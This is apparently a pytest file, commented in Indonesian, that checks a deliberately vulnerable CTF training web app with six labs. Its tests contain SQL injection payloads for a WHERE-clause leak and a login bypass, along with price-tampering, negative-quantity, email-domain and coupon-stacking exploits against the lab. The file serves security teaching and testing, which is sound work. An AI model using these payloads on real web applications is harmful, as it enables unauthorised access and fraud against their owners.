import os
import tempfile
import pytest

# Atur variabel lingkungan default untuk pengujian
os.environ["SECRET_KEY"] = "test-secret-key-nusatech"
os.environ["DB_PATH"] = os.path.join(
    tempfile.mkdtemp(prefix="nusatech-test-init-"), "init.db"
)
os.environ.pop("LAB", None)
for num in range(1, 7):
    os.environ[f"FLAG_{num}"] = f"CTF{{test_flag_nusatech_{num}}}"

from app import create_app  # noqa: E402


def flag(num):
    return f"CTF{{test_flag_nusatech_{num}}}"


def assert_has_flag(response, num):
    assert flag(num) in response.get_data(as_text=True)


def assert_no_flag(response, num):
    assert flag(num) not in response.get_data(as_text=True)


@pytest.fixture
def make_client(tmp_path, monkeypatch):
    def _make(lab=None, name="lab_test.db"):
        db_file = str(tmp_path / name)
        monkeypatch.setenv("DB_PATH", db_file)
        if lab is None:
            monkeypatch.delenv("LAB", raising=False)
        else:
            monkeypatch.setenv("LAB", str(lab))

        app = create_app()
        app.config.update(TESTING=True)
        return app.test_client()

    return _make


@pytest.fixture
def client(make_client):
    return make_client()


# ==============================================================================
# Tes Mode All-in-One (LAB Kosong)
# ==============================================================================
def test_index_lists_all_labs(client):
    resp = client.get("/")
    assert resp.status_code == 200
    body = resp.get_data(as_text=True)
    for n in range(1, 7):
        assert f"/lab{n}" in body


# ==============================================================================
# Lab 1: SQL Injection WHERE Clause
# ==============================================================================
def test_lab1_sqli_exploit(client):
    resp = client.get("/lab1", query_string={"category": "Elektronik' OR 1=1--"})
    assert resp.status_code == 200
    assert_has_flag(resp, 1)
    assert "Prototipe Sensor Cuaca v3" in resp.get_data(as_text=True)


def test_lab1_normal_category_hides_flag(client):
    resp = client.get("/lab1", query_string={"category": "Elektronik"})
    assert resp.status_code == 200
    assert_no_flag(resp, 1)
    assert "Prototipe Sensor Cuaca v3" not in resp.get_data(as_text=True)


# ==============================================================================
# Lab 2: SQL Injection Login Bypass
# ==============================================================================
def test_lab2_sqli_login_exploit(client):
    resp = client.post(
        "/lab2", data={"username": "admin_utama'--", "password": "any_password"}
    )
    assert resp.status_code == 200
    assert_has_flag(resp, 2)
    assert "Administrator Utama" in resp.get_data(as_text=True)


def test_lab2_normal_login_does_not_show_flag(client):
    resp = client.post(
        "/lab2", data={"username": "budi_santoso", "password": "password123"}
    )
    assert resp.status_code == 200
    assert "pelanggan reguler" in resp.get_data(as_text=True)
    assert_no_flag(resp, 2)


# ==============================================================================
# Lab 3: Excessive Trust in Client-Side Controls (Price Tampering)
# ==============================================================================
def test_lab3_price_tampering_cart_exploit(client):
    # Tambah Drone Elang X200 dengan harga yang dimanipulasi client jadi $1.00
    client.post(
        "/lab3",
        data={"action": "add", "pid": "1", "qty": "1", "price": "1.00"},
        follow_redirects=True,
    )
    # Lakukan checkout pesanan
    resp = client.post("/lab3", data={"action": "checkout"}, follow_redirects=True)
    assert resp.status_code == 200
    assert_has_flag(resp, 3)


def test_lab3_multi_item_cart_exploit(client):
    # Tambahkan drone dengan harga manipulasi
    client.post(
        "/lab3",
        data={"action": "add", "pid": "1", "qty": "1", "price": "2.50"},
        follow_redirects=True,
    )
    # Tambahkan earphone dengan harga normal
    client.post(
        "/lab3",
        data={"action": "add", "pid": "2", "qty": "1", "price": "42.00"},
        follow_redirects=True,
    )
    # Total $44.50 <= Saldo $100.00
    resp = client.post("/lab3", data={"action": "checkout"}, follow_redirects=True)
    assert resp.status_code == 200
    assert_has_flag(resp, 3)


def test_lab3_full_price_is_rejected(client):
    # Tambahkan dengan harga asli $1249.00
    client.post(
        "/lab3",
        data={"action": "add", "pid": "1", "qty": "1", "price": "1249.00"},
        follow_redirects=True,
    )
    resp = client.post("/lab3", data={"action": "checkout"}, follow_redirects=True)
    assert resp.status_code == 200
    assert "Saldo akun" in resp.get_data(as_text=True)
    assert_no_flag(resp, 3)


def test_lab3_direct_post_exploit(client):
    # Dukungan kompatibilitas backward langsung POST harga
    resp = client.post("/lab3", data={"pid": "1", "price": "1.00"}, follow_redirects=True)
    assert resp.status_code == 200
    assert_has_flag(resp, 3)


# ==============================================================================
# Lab 4: High-Level Logic Vulnerability (Negative Quantity)
# ==============================================================================
def test_lab4_negative_quantity_exploit(client):
    # Tambah 1 Drone ($1249.00)
    client.post("/lab4", data={"action": "add", "pid": "1", "qty": "1"})
    # Tambah -28 Earbuds (-$1176.00) => Total = $73.00 <= $100.00
    client.post("/lab4", data={"action": "add", "pid": "2", "qty": "-28"})

    resp = client.post("/lab4", data={"action": "checkout"}, follow_redirects=True)
    assert resp.status_code == 200
    assert_has_flag(resp, 4)


def test_lab4_normal_checkout_is_rejected(client):
    client.post("/lab4", data={"action": "add", "pid": "1", "qty": "1"})
    resp = client.post("/lab4", data={"action": "checkout"}, follow_redirects=True)
    assert resp.status_code == 200
    assert "Saldo akun" in resp.get_data(as_text=True)
    assert_no_flag(resp, 4)


# ==============================================================================
# Lab 5: Inconsistent Security Controls (Email Domain Flaw)
# ==============================================================================
def test_lab5_email_change_exploit(client):
    # Registrasi akun dengan email publik
    client.post(
        "/lab5/register",
        data={"username": "doni", "password": "password123", "email": "doni@gmail.com"},
    )
    # Login akun
    client.post("/lab5/login", data={"username": "doni", "password": "password123"})
    # Perbarui email ke domain internal perusahaan
    client.post("/lab5/update-email", data={"email": "doni@nusatech.internal"})
    # Akses portal internal
    resp = client.get("/lab5/internal")
    assert resp.status_code == 200
    assert_has_flag(resp, 5)


def test_lab5_corp_email_registration_is_blocked(client):
    resp = client.post(
        "/lab5/register",
        data={
            "username": "hacker",
            "password": "password123",
            "email": "hacker@nusatech.internal",
        },
        follow_redirects=True,
    )
    assert "dibatasi untuk staf resmi" in resp.get_data(as_text=True)
    # Verifikasi akun tidak terbentuk
    client.post("/lab5/login", data={"username": "hacker", "password": "password123"})
    assert client.get("/lab5/internal").status_code == 403


def test_lab5_normal_email_cannot_open_admin(client):
    client.post(
        "/lab5/register",
        data={"username": "cindy", "password": "password123", "email": "cindy@yahoo.com"},
    )
    client.post("/lab5/login", data={"username": "cindy", "password": "password123"})
    assert client.get("/lab5/internal").status_code == 403


# ==============================================================================
# Lab 6: Flawed Enforcement of Business Rules (Alternating Coupons)
# ==============================================================================
def test_lab6_stacked_coupons_exploit(client):
    # Bergantian HEMAT50 dan DISKON30 ~7 putaran
    for _ in range(7):
        client.post("/lab6/coupon", data={"code": "HEMAT50"})
        client.post("/lab6/coupon", data={"code": "DISKON30"})

    resp = client.post("/lab6/checkout", follow_redirects=True)
    assert resp.status_code == 200
    assert_has_flag(resp, 6)


def test_lab6_same_coupon_twice_is_rejected(client):
    client.post("/lab6/coupon", data={"code": "HEMAT50"})
    resp = client.post("/lab6/coupon", data={"code": "HEMAT50"}, follow_redirects=True)
    assert "tidak dapat digunakan dua kali berturut-turut" in resp.get_data(as_text=True)

    resp_checkout = client.post("/lab6/checkout", follow_redirects=True)
    assert_no_flag(resp_checkout, 6)


# ==============================================================================
# Tes Restriksi Mode Kontainer Tunggal (LAB=1..6)
# ==============================================================================
@pytest.mark.parametrize("active_lab", range(1, 7))
def test_lab_mode_restricts_other_labs(make_client, active_lab):
    lab_client = make_client(lab=active_lab)

    # Root me-redirect ke /lab{active_lab}
    root_resp = lab_client.get("/")
    assert root_resp.status_code == 302
    assert root_resp.headers["Location"].endswith(f"/lab{active_lab}")

    # Halaman lab aktif 200 OK
    assert lab_client.get(f"/lab{active_lab}").status_code == 200

    # Lab lain mengembalikan 404
    other_lab = 2 if active_lab == 1 else 1
    assert lab_client.get(f"/lab{other_lab}").status_code == 404

    # Route /reset tetap dapat diakses
    assert lab_client.get("/reset").status_code == 302
